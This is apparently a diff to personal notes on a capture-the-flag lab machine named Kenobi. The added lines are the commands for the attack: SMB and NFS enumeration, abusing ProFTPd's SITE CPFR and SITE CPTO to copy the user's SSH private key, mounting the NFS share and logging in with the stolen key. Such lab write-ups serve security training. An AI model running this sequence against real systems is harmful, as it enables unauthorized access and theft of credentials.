@@ -11,5 +11,26 @@ smbget -R smb://10.10.251.221/anonymous
 Enumerating NFS
 nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.251.221
 
+Gaing initial access with ProFTPd
+Finding the ProFTPd version
+nc 10.10.251.221 21
+
+Using SITE CPFR and SITE CPTO commands to copy Kenobi's private key(in nc)
+SITE CPFR /home/kenobi/.ssh/id_rsa
+SITE CPTO /var/tmp/id_rsa
+
+Mounting /var/tmp directory to our machine
+mkdir /mnt/kenobiNFS
+mount 10.10.251.221:/var /mnt/kenobiNFS
+ls -la /mnt/kenobiNFS
+
+copy the private key
+cp /mnt/kenobiNFS/tmp/id_rsa .
+sudo chmod 600 id_rsa
+ssh -i id_rsa kenobi@10.10.251.221
+
+
+
+
  
   
